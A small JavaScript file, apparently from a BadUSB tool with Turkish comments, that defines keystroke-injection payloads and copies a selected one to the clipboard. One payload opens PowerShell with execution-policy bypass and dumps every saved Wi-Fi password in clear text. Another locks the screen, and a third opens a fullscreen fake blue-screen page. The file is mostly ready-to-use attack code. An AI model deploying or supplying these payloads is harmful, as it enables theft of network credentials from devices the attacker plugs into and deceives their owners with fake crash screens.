const BadUsbPayloads = {
    WIFI: `REM WI-FI Sifrelerini Gosterme Betigi\nDELAY 1000\nGUI r\nDELAY 200\nSTRING powershell -NoP -Ep Bypass -C "netsh wlan show profiles name=* key=clear"\nENTER`,
    LOCK: `REM Windows Kilit Betigi\nDELAY 500\nWINDOWS l`,
    FAKE: `REM Sahte BSOD Ekrani\nDELAY 500\nGUI r\nDELAY 200\nSTRING chrome --start-fullscreen https://fakeupdate.net/bsod/\nENTER`
};

function generateBadUsb(type) {
    const payload = BadUsbPayloads[type] || "Bilinmeyen senaryo.";
    navigator.clipboard.writeText(payload).catch(() => {}); // Kodu telefonun/PC'nin panosuna kopyalar
    return payload;
}
